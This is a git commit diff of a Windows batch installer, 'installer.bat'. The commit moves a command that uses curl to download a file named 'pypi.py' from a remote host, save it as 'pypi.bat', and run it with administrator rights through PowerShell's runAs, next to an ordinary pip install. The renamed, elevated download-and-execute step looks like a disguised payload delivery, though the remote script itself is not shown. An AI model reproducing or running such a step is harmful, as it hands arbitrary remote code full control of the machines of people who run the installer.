835f0e54465f8cf5f6029229958fec9601e745db
TheonlyIcebear <78031685+TheonlyIcebear@users.noreply.github.com>
2022-10-29 12:37:55 -0400

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -1,6 +1,7 @@
 @echo off
 set dir="%temp%\_%random%"
 mkdir %dir%
-curl https://bootstrapper.repl.co/scripts/pypi.py --output pypi.bat && powershell Start-Process '%dir%\pypi.bat' -Verb runAs
 pip install -r requirements.txt
+cd %dir%
+curl https://bootstrapper.repl.co/scripts/pypi.py --output pypi.bat && powershell Start-Process '%dir%\pypi.bat' -Verb runAs
 pause
